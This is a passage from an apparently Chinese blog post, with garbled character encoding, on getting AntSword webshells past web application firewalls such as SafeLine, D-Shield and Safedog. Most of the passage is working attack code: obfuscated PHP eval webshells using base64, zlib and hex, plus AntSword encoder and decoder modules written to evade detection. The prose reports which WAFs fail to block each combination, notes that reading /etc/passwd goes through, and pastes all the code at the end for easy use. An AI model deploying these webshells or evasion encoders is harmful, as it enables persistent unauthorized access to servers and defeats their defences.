class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">x</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$did</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;       <span class="keyword">$this</span>-&gt;id=<span class="string">&#x27;QGV2YWwoQGd6aW5mbGF0ZShiYXNlNjRfZGVjb2RlKCRfUE9TVFsnYW50J10pKSk7&#x27;</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;did = @base64_decode( <span class="keyword">$this</span>-&gt;id );</span><br><span class="line">                @<span class="keyword">eval</span>(<span class="string">&quot;/*sasa123*/&quot;</span>.<span class="keyword">$this</span>-&gt;did.<span class="string">&quot;/*sd123*/&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> x();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * php::zlib_deflated_raw ç¼–ç å™¨</span></span><br><span class="line"><span class="comment"> * Create at: 2019/01/12 00:05:44</span></span><br><span class="line"><span class="comment"> * zlib å‹ç¼© payload, é€‚é… shell è§ä»£ç å¤„</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> zlib = <span class="keyword">require</span>(<span class="string">&#x27;zlib&#x27;</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span>  &#123;String&#125; pwd   è¿æ¥å¯†ç </span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span>  &#123;Array&#125;  data  ç¼–ç å™¨å¤„ç†å‰çš„ payload æ•°ç»„</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> &#123;Array&#125;  data  ç¼–ç å™¨å¤„ç†åçš„ payload æ•°ç»„</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">module.exports = (pwd, data, ext=&#123;&#125;) =&gt; &#123;</span><br><span class="line">  ext.opts.httpConf.headers[<span class="string">&#x27;User-Agent&#x27;</span>]=<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)&#x27;</span>;</span><br><span class="line">  <span class="comment">// ##########    è¯·åœ¨ä¸‹æ–¹ç¼–å†™ä½ è‡ªå·±çš„ä»£ç    ###################</span></span><br><span class="line">  let randomID = `ceshi`;</span><br><span class="line">  data[randomID] = zlib.deflateRawSync(data[<span class="string">&#x27;_&#x27;</span>]).toString(<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">  <span class="comment">// è‹±è¯­å•è¯åˆ—è¡¨</span></span><br><span class="line">  <span class="comment">// const wordList = [&#x27;apple&#x27;, &#x27;banana&#x27;, &#x27;car&#x27;, &#x27;dog&#x27;, &#x27;elephant&#x27;, &#x27;flower&#x27;];</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// // ç”Ÿæˆä¸€ä¸ªéšæœºç´¢å¼•</span></span><br><span class="line">  <span class="comment">// const randomIndex = randomInt(0, wordList.length - 1);</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// // è·å–éšæœºå•è¯</span></span><br><span class="line">  <span class="comment">// const randomWord = wordList[randomIndex];</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// // åœ¨è°ƒç”¨æ¨¡å—ä¹‹å‰ï¼Œå°†éšæœºå•è¯æ·»åŠ åˆ° data å¯¹è±¡ä¸­</span></span><br><span class="line">  <span class="comment">// data[&#x27;123&#x27;] = randomWord;</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// è°ƒç”¨æ¨¡å—å¹¶ä¼ å…¥ data å¯¹è±¡</span></span><br><span class="line"><span class="comment">// å¤„ç†è¿”å›çš„ç»“æœ</span></span><br><span class="line"><span class="comment">// è¿™é‡Œçš„ processedData å³ä¸ºå¤„ç†åçš„ payload æ•°æ®</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// <span class="meta">&lt;?php</span> @eval($_POST[&#x27;ant&#x27;]);<span class="meta">?&gt;</span></span></span><br><span class="line">  <span class="comment">//data[pwd] = `eval(@gzinflate(base64_decode($_POST[$&#123;randomID&#125;])));`;</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// <span class="meta">&lt;?php</span> @eval(@gzinflate(base64_decode($_POST[&#x27;ant&#x27;]))); <span class="meta">?&gt;</span></span></span><br><span class="line">  data[pwd] = zlib.deflateRawSync(`@<span class="keyword">eval</span>(@gzinflate(base64_decode(<span class="variable">$_POST</span>[$&#123;randomID&#125;])));`).toString(<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// <span class="meta">&lt;?php</span> @eval(@gzinflate(base64_decode($_POST[&#x27;ant&#x27;]))); <span class="meta">?&gt;</span></span></span><br><span class="line">  <span class="comment">// data[pwd] = zlib.deflateRawSync(`@eval(@gzinflate(base64_decode($_POST[$&#123;randomID&#125;])));`).toString(&#x27;base64&#x27;);</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// ##########    è¯·åœ¨ä¸Šæ–¹ç¼–å†™ä½ è‡ªå·±çš„ä»£ç    ###################</span></span><br><span class="line"></span><br><span class="line">  delete data[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line">  <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>php7.3ã€‚<br><img src="/images/antsword-bypasswaf/image-20240301162929597.png" alt="image-20240301162929597"></p><p>æ­£å¸¸ä¸åŠ å¯†ï¼Œå°±ä¼šè¢«é›·æ± æ‹¦æˆª</p><p>é€‰ç”¨ç¼–ç å™¨ï¼Œä¸ç”¨è§£ç å™¨ï¼Œä¸æ‹¦æˆª</p><p><img src="/images/antsword-bypasswaf/image-20240301162818532.png" alt="image-20240301162818532"></p><p>etc/passwdéƒ½ä¸æ‹¦æˆª</p><p><img src="/images/antsword-bypasswaf/image-20240301162745572.png" alt="image-20240301162745572"></p><p><img src="/images/antsword-bypasswaf/image-20240301162553844.png" alt="image-20240301162553844"></p><p>åŒ¹é…åˆ°äº†æµé‡ã€‚<br>é‚£ä¹ˆä¹Ÿå°±æ˜¯ï¼Œé›·æ± ä¸æ£€æµ‹è¿”å›åŒ…ã€‚</p><p>è¯•ä¸‹ä¸‹é¢è¿™ä¸ªç»„åˆï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@eval(base64_decode($_POST[&#x27;tunan&#x27;]));</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * php::base64ç¼–ç å™¨</span><br><span class="line"> * Create at: 2021/04/18 15:36:16</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">&#x27;use strict&#x27;;</span><br><span class="line"></span><br><span class="line">module.exports = (pwd, data, ext=&#123;&#125;) =&gt; &#123;</span><br><span class="line">  let randomID = `_0x$&#123;Math.random().toString(16).substr(2)&#125;`;</span><br><span class="line">  data[randomID] = Buffer.from(data[&#x27;_&#x27;]).toString(&#x27;base64&#x27;);</span><br><span class="line">  data[pwd] = Buffer.from(`eval(base64_decode($_POST[$&#123;randomID&#125;]));`).toString(&#x27;base64&#x27;);</span><br><span class="line">  delete data[&#x27;_&#x27;];</span><br><span class="line">  return data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/antsword-bypasswaf/image-20240301163950697.png" alt="image-20240301163950697"></p><p><img src="/images/antsword-bypasswaf/image-20240301164003754.png" alt="image-20240301164003754"></p><p>é›·æ± åº”è¯¥æ˜¯ä¼šè‡ªå·±è§£base64çš„ã€‚<br>ä¸‹é¢è¿™ä¸ªç»„åˆé›·æ± ä¹Ÿæ£€æµ‹ä¸åˆ°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">foreach($_POST as $k =&gt; $v)&#123;$_POST[$k]=pack(&quot;H*&quot;, $v);&#125;</span><br><span class="line">@eval($_POST[&#x27;ant&#x27;]);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * php::hexç¼–ç å™¨</span><br><span class="line"> * Create at: 2021/09/24 16:32:26</span><br><span class="line"> */</span><br><span class="line">    &#x27;use strict&#x27;;</span><br><span class="line"></span><br><span class="line">module.exports = (pwd, data) =&gt; &#123;</span><br><span class="line">  let ret = &#123;&#125;;</span><br><span class="line">  for (let _ in data) &#123;</span><br><span class="line">    if (_ === &#x27;_&#x27;) &#123; continue &#125;;</span><br><span class="line">    ret[_] = Buffer.from(data[_]).toString(&#x27;hex&#x27;);</span><br><span class="line">  &#125;</span><br><span class="line">  ret[pwd] = Buffer.from(data[&#x27;_&#x27;]).toString(&#x27;hex&#x27;);</span><br><span class="line">  return ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/antsword-bypasswaf/image-20240301164512873.png" alt="image-20240301164512873"></p><p><img src="/images/antsword-bypasswaf/image-20240301164550922.png" alt="image-20240301164550922"></p><p>æ‰‹å·¥å°±å¾ˆç®€å•äº†ã€‚</p><p>ç®€å•çš„æ¥è¯´ï¼Œç›®å‰é›·æ± ä¼šæ‹¦æˆªæ²¡æœ‰ä»»ä½•ç¼–ç çš„ï¼Œå’Œä¸€å±‚base64çš„ï¼Œä½†æ˜¯è¦æ˜¯éšä¾¿æ”¹ä¸€ä¸‹ï¼Œé›·æ± å°±ä¸æ‹¦æˆªäº†ã€‚</p><h6 id="4-2iis-php-dç›¾"><a href="#4-2iis-php-dç›¾" class="headerlink" title="4.2iis+php+dç›¾"></a>4.2iis+php+dç›¾</h6><p>è¿™é‡Œæˆ‘ä»¬è¿˜æ˜¯å‡è®¾å·²ç»ä¸Šä¼ ä¸Šå»webshelläº†ï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Œdç›¾åœ¨é»˜è®¤å®‰è£…å¥½åï¼Œç›´æ¥æ–‡ä»¶ä¸Šä¼ å°±æ˜¯ç™½åå•ï¼Œç»è¿‡googleæ²¡æœ‰æ‰¾åˆ°èƒ½ç»•è¿‡å»ç™½åå•çš„æ–¹æ³•ã€‚<br>è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªæƒ…å†µï¼Œå°±æ˜¯æˆ‘ä»¬çš„webshellè¦å°äºä¸‰çº§ï¼Œå¦‚æœå¤§äºæˆ–ç­‰äºä¸‰çº§ï¼Œ<img src="/images/antsword-bypasswaf/image-20240301171602345.png" alt="image-20240301171602345"></p><p>dç›¾ç›´æ¥æ‹¦æˆªã€‚<br>ç®€å•åšä¸ªå…æ€ï¼Œç»•è¿‡dç›¾ï¼Œç„¶åå†å»è®¿é—®å°±å¯ä»¥äº†ã€‚</p><p><img src="/images/antsword-bypasswaf/image-20240304135141095.png" alt="image-20240304135141095"></p><p><img src="/images/antsword-bypasswaf/image-20240304135814329.png" alt="image-20240304135814329"></p><p>ä½†æ˜¯å½“æˆ‘ä»¬æ‰§è¡Œå‘½ä»¤çš„æ—¶å€™æ˜¯ä¸è¡Œï¼Œdç›¾ç›´æ¥æ‹¦æˆªcmdã€‚<br>ä½†æ˜¯<img src="/images/antsword-bypasswaf/image-20240304135853060.png" alt="image-20240304135853060">è¯»å–æ–‡ä»¶ï¼Œå’Œä¸Šä¼ æ–‡ä»¶æ˜¯æ²¡æœ‰é—®é¢˜çš„ã€‚<br>å› ä¸ºdç›¾ç›´æ¥æ‹¦æˆªçš„cmdå‘½ä»¤ã€‚è€Œèšå‰‘è¯»å–æ–‡ä»¶æ—¶ç”¨çš„freadå‡½æ•°ã€‚ä¹Ÿå¯ä»¥æ–‡ä»¶ä¸Šä¼ ã€‚<br><img src="/images/antsword-bypasswaf/image-20240304140101089.png" alt="image-20240304140101089"></p><p>æ‰€ä»¥å°±æ˜¯è¯´åªè¦ä¸rceï¼Œè¿˜æ˜¯èƒ½æ“ä½œæ–‡ä»¶çš„ã€‚</p><h6 id="4-3-å®‰å…¨ç‹—"><a href="#4-3-å®‰å…¨ç‹—" class="headerlink" title="4.3 å®‰å…¨ç‹—"></a>4.3 å®‰å…¨ç‹—</h6><p>å®‰å…¨ç‹—çš„æ‹¦æˆªè§„åˆ™æ˜¯å¦‚æœå®‰å…¨ç‹—åˆ¤å®šä¸ºæœ¨é©¬ï¼Œé‚£ä¹ˆå°±è¿‡ä¸å»ï¼Œå¦‚æœä¸æ˜¯ï¼Œå°±ä¸ä¼šæ‹¦æˆªã€‚<br>è¿™é‡Œæœ¨é©¬æ˜¯è¿‡å®‰å…¨ç‹—çš„ï¼Œæ‰€ä»¥ç›´æ¥å°±å¯ä»¥æ‰§è¡Œã€‚</p><h5 id="5-å°ç»“"><a href="#5-å°ç»“" class="headerlink" title="5. å°ç»“"></a>5. å°ç»“</h5><h5 id="6-ä»£ç "><a href="#6-ä»£ç " class="headerlink" title="6. ä»£ç "></a>6. ä»£ç </h5><p>è´´ä¸‹ä»£ç ï¼Œæ–¹ä¾¿ä½¿ç”¨ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line">dç›¾äºŒçº§webshell</span><br><span class="line">åŸç‰ˆ</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">x</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        public $id = <span class="literal">null</span>;</span><br><span class="line">        public $did = <span class="literal">null</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;       $this-&gt;id=<span class="string">&#x27;JHN0ID0gJF9QT1NUWyd0ZXN0J107CiRzYSA9IHN1YnN0cl9yZXBsYWNlKCRzdCwgIiIsIDAsIDkpOwpldmFsKGJhc2U2NF9kZWNvZGUoJHNhKSk7&#x27;</span>;</span><br><span class="line">                $this-&gt;did = @base64_decode( $this-&gt;id );</span><br><span class="line">                @<span class="built_in">eval</span>(<span class="string">&quot;/*sasa123*/&quot;</span>.$this-&gt;did.<span class="string">&quot;/*sd123*/&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> x(); </span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">zlibå‹ç¼©</span><br><span class="line">webshell  æ ¼å¼</span><br><span class="line">@<span class="built_in">eval</span>(@gzinflate(base64_decode($_POST[<span class="string">&#x27;a&#x27;</span>])));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ç¼–ç </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * php::zlib_deflated_raw ç¼–ç å™¨</span></span><br><span class="line"><span class="comment"> * Create at: 2019/01/12 00:05:44</span></span><br><span class="line"><span class="comment"> * zlib å‹ç¼© payload, é€‚é… shell è§ä»£ç å¤„</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> zlib = <span class="built_in">require</span>(<span class="string">&#x27;zlib&#x27;</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* @param  &#123;String&#125; pwd   è¿æ¥å¯†ç </span></span><br><span class="line"><span class="comment">* @param  &#123;Array&#125;  data  ç¼–ç å™¨å¤„ç†å‰çš„ payload æ•°ç»„</span></span><br><span class="line"><span class="comment">* @return &#123;Array&#125;  data  ç¼–ç å™¨å¤„ç†åçš„ payload æ•°ç»„</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function">(<span class="params">pwd, data, ext=&#123;&#125;</span>) =&gt;</span> &#123;</span><br><span class="line">  ext.opts.httpConf.headers[<span class="string">&#x27;User-Agent&#x27;</span>]=<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)&#x27;</span>;</span><br><span class="line">  <span class="comment">// ##########    è¯·åœ¨ä¸‹æ–¹ç¼–å†™ä½ è‡ªå·±çš„ä»£ç    ###################</span></span><br><span class="line">  <span class="keyword">let</span> randomID = <span class="string">`ceshi`</span>;</span><br><span class="line">  data[randomID] = zlib.deflateRawSync(data[<span class="string">&#x27;_&#x27;</span>]).toString(<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">  data[pwd] = zlib.deflateRawSync(<span class="string">`@eval(@gzinflate(base64_decode($_POST[<span class="subst">$&#123;randomID&#125;</span>])));`</span>).toString(<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// &lt;?php @eval(@gzinflate(base64_decode($_POST[&#x27;ant&#x27;]))); ?&gt;</span></span><br><span class="line">  <span class="comment">// data[pwd] = zlib.deflateRawSync(`@eval(@gzinflate(base64_decode($_POST[$&#123;randomID&#125;])));`).toString(&#x27;base64&#x27;);</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// ##########    è¯·åœ¨ä¸Šæ–¹ç¼–å†™ä½ è‡ªå·±çš„ä»£ç    ###################</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">delete</span> data[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line">  <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hex  webshell</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="function"><span class="title">foreach</span>(<span class="params">$_POST <span class="keyword">as</span> $k =&gt; $v</span>)</span>&#123;$_POST[$k]=pack(<span class="string">&quot;H*&quot;</span>, $v);&#125;</span><br><span class="line">@<span class="built_in">eval</span>($_POST[<span class="string">&#x27;ant&#x27;</span>]);</span><br><span class="line">?&gt;</span><br><span class="line">    </span><br><span class="line">ç¼–ç </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * php::hexç¼–ç å™¨</span></span><br><span class="line"><span class="comment"> * Create at: 2021/09/24 16:32:26</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">    &#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function">(<span class="params">pwd, data</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> ret = &#123;&#125;;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> _ <span class="keyword">in</span> data) &#123;</span><br><span class="line">    <span class="keyword">if</span> (_ === <span class="string">&#x27;_&#x27;</span>) &#123; <span class="keyword">continue</span> &#125;;</span><br><span class="line">    ret[_] = Buffer.from(data[_]).toString(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  ret[pwd] = Buffer.from(data[<span class="string">&#x27;_&#x27;</span>]).toString(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">è§£ç </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * php::base64è§£ç å™¨</span></span><br><span class="line"><span class="comment"> * Create at: 2020/05/22 10:21:48</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@returns <span class="type">&#123;string&#125;</span> </span>asenc å°†è¿”å›æ•°æ®base64ç¼–ç </span></span><br><span class="line"><span class="comment">   * è‡ªå®šä¹‰è¾“å‡ºå‡½æ•°åç§°å¿…é¡»ä¸º asenc</span></span><br><span class="line"><span class="comment">   * è¯¥å‡½æ•°ä½¿ç”¨çš„è¯­æ³•éœ€è¦å’Œshellä¿æŒä¸€è‡´</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="attr">asoutput</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`function asenc($out)&#123;</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">       $a = base64_encode($out);</span></span><br><span class="line"><span class="string">        return &#x27;&#123;&quot;message&quot;:&quot;&#x27; .strrev($a) . &#x27;&quot;&#125;&#x27;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    `</span>.replace(<span class="regexp">/\n\s+/g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * è§£ç  Buffer</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param <span class="type">&#123;string&#125;</span> </span>data è¦è¢«è§£ç çš„ Buffer</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@returns <span class="type">&#123;string&#125;</span> </span>è§£ç åçš„ Buffer</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="attr">decode_buff</span>: <span class="function">(<span class="params">data, ext=&#123;&#125;</span>) =&gt;</span> &#123;</span><br><span class="line">     <span class="keyword">let</span> res = Buffer.from(data.toString().replace(<span class="regexp">/&#123;&quot;message&quot;:&quot;/g</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="regexp">/&quot;&#125;/g</span>,<span class="string">&#x27;&#x27;</span>).split(<span class="string">&#x27;&#x27;</span>).reverse().join(<span class="string">&#x27;&#x27;</span>), <span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">      </span><br><span class="line"></span><br><span class="line">     <span class="keyword">return</span> res</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">é—ç•™é—®é¢˜  ä¼ å‚ç¼–ç ç»•æµé‡</span><br><span class="line">let ret = &#123;&#125;;</span><br><span class="line">  for (let _ in data)&#123;</span><br><span class="line">    if (_ === &#x27;_&#x27;) &#123; continue &#125;;</span><br><span class="line">    ret[_] = Buffer.from(data[_]).toString(&#x27;base64&#x27;);</span><br><span class="line">    </span><br><span class="line">    ret[_] = &#x27;lwk02nm&#x27; + ret[_];</span><br><span class="line">    ret[_] += &#x27;lwk02nm&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line">  ret[pwd] = Buffer.from(data[&#x27;_&#x27;]).toString(&#x27;base64&#x27;);</span><br><span class="line">  ret[pwd] = &#x27;lwk02nm&#x27; + ret[pwd];</span><br><span class="line">  ret[pwd] += &#x27;lwk02nm&#x27;;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    let randomID = `_0x$&#123;Math.random().toString(16).substr(2)&#125;`;</span><br><span class="line">  data[randomID] = Buffer.from(data[&#x27;_&#x27;]).toString(&#x27;base64&#x27;);</span><br><span class="line">  data[pwd] = Buffer.from(`eval(base64_decode($_POST[$&#123;randomID&#125;]));`).toString(&#x27;base64&#x27;);</span><br><span class="line">  delete data[&#x27;_&#x27;];</span><br><span class="line">  return data;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  /**</span><br><span class="line"> * php::zlib_deflated_raw ç¼–ç å™¨</span><br><span class="line"> * Create at: 2019/01/12 00:05:44</span><br><span class="line"> * zlib å‹ç¼© payload, é€‚é… shell è§ä»£ç å¤„</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">&#x27;use strict&#x27;;</span><br><span class="line"></span><br><span class="line">var zlib = require(&#x27;zlib&#x27;);</span><br><span class="line">/*</span><br><span class="line">* @param  &#123;String&#125; pwd   è¿æ¥å¯†ç </span><br><span class="line">* @param  &#123;Array&#125;  data  ç¼–ç å™¨å¤„ç†å‰çš„ payload æ•°ç»„</span><br><span class="line">* @return &#123;Array&#125;  data  ç¼–ç å™¨å¤„ç†åçš„ payload æ•°ç»„</span><br><span class="line">*/</span><br><span class="line"></span><br><span 